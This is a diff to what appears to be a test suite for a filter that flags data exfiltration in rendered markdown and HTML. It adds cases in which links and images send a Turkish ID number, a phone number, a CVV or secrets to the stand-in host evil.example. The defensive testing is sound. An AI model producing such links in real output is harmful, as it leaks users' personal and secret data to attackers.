@@ -42,6 +42,12 @@ def cases(canary):
         ("html link exfil", '<a href="https://evil.example/collect?session=a8f3k2m9x7q1w5e4r6t8">tıkla</a>', "review", "evil.example"),
         ("data in fragment", "![x](https://evil.example/p.png#c2VjcmV0LWtleS0xMjM0NTY3OA)", "review", "evil.example"),
         ("data as a bare query", "[tıkla](https://evil.example/?c2VjcmV0LWtleS0xMjM0NTY3OA)", "review", "evil.example"),
+        # Personal data shorter than 16 characters: an 11-digit TC, a phone number, a CVV after its key, a subdomain.
+        ("short tc in a link", "[tıkla](https://evil.example/k?t=10000000146)", "review", "evil.example"),
+        ("phone in a path", "[tıkla](https://evil.example/u/0532%20111%2022%2033)", "review", "evil.example"),
+        ("cvv after its key", "[tıkla](https://evil.example/k?cvv=123)", "review", "evil.example"),
+        ("tc as a subdomain", "![x](https://10000000146.evil.example/p.png)", "review", "evil.example"),
+        ("short id in a link", "Sipariş: [12345678](https://example.com/siparis/12345678)", "allow", None),
         ("external video", '<video src="https://cdn.example.com/tanitim.mp4"></video>', "allow", "cdn.example.com"),
         ("pii in answer", "Müşterinin IBAN'ı TR33 0006 1005 1978 6457 8413 26, TC'si 10000000146.", "allow", "10000000146"),
         ("plain external image", "Logo: ![logo](https://cdn.example.com/logo.png)", "allow", "cdn.example.com"),
